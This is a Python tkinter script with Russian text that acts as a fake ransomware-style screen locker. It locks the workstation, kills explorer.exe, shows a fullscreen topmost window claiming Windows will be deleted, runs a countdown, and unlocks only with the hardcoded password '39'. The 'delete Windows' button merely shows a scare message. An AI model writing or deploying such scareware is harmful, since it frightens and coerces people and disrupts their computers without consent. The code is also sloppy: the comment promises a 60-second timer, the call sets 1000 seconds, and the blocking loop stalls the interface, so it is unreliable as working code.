import time
import tkinter as tk
from tkinter import messagebox, Entry, Button, Label
import os
import ctypes

# Блокируем диспетчер задач
ctypes.windll.user32.LockWorkStation()

# Отключаем системные комбинации клавиш
def disable_keys():
    os.system('rundll32.exe user32.dll,LockWorkStation')
    os.system('taskkill /f /im explorer.exe')

# Создаем главное окно
root = tk.Tk()
root.title("System Locked")
root.attributes('-fullscreen', True)
root.attributes('-topmost', True)
root.configure(bg='#000000')

# Добавляем элементы интерфейса
title_label = Label(root, text="ТВОЯ СИСТЕМА ЗАБЛОКИРОВАНА XD",
    fg='#FF0000', bg='#000000',
    font=('Arial', 48, 'bold'))
title_label.place(relx=0.5, rely=0.2, anchor='center')

timer_label = Label(root, text="00:00",
    fg='#FF0000', bg='#000000',
    font=('Arial', 48, 'bold'))
timer_label.place(relx=0.5, rely=0.4, anchor='center')

password_entry = Entry(root, width=20,
    fg='#FFFFFF', bg='#333333',
    font=('Arial', 24), show='*')
password_entry.place(relx=0.5, rely=0.6, anchor='center')

warning_label = Label(root, text="ВНИМАНИЕ!\nWindows удалится через:",
    fg='#FFFF00', bg='#000000',
    font=('Arial', 24))
warning_label.place(relx=0.5, rely=0.3, anchor='center')

# Функция таймера
def countdown(t):
    while t:
        mins, secs = divmod(t, 60)
        timeformat = '{:02d}:{:02d}'.format(mins, secs)
        timer_label.config(text=timeformat)
        root.update()
        time.sleep(1)
        t -= 1
    timer_label.config(text="SYSTEM SHUTDOWN!")

# Функция проверки пароля
def check_password():
    if password_entry.get() == "39":
        messagebox.showinfo("Success", "Система разблокирована!!")
        root.destroy()
        os.system('start explorer')
    else:
        messagebox.showerror("Error", "Неверный пароль!")

# Функция фейковой кнопки
def fake_delete():
    messagebox.showwarning("Warning", "происходит удаления системы")

# Кнопки
activate_button = Button(root, text="ПРОВЕРИТЬ ПАРОЛЬ",
    command=check_password,
    fg='#FFFFFF', bg='#00FF00',
    font=('Arial', 24, 'bold'))
activate_button.place(relx=0.5, rely=0.7, anchor='center')

delete_button = Button(root, text="УДАЛИТЬ WINDOWS",
    command=fake_delete,
    fg='#FFFFFF', bg='#FF0000',
    font=('Arial', 24, 'bold'))
delete_button.place(relx=0.5, rely=0.8, anchor='center')

# Запускаем таймер на 60 секунд
disable_keys()
countdown(1000)

root.mainloop()
